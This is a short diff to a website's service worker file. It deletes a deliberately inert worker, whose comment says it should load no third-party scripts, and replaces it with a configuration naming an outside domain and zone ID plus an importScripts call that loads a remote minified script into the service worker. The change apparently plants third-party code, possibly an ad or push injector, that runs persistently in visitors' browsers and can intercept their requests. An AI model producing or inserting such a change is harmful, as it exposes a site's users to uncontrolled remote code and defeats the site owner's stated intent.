@@ -1,11 +1,6 @@
-self.addEventListener('install', (event) => {
-  self.skipWaiting();
-});
-
-self.addEventListener('activate', (event) => {
-  event.waitUntil(self.clients.claim());
-});
-
-self.addEventListener('fetch', (event) => {
-  // Intentionally empty: keep the service worker harmless and do not load third-party scripts.
-});
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 11842023
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
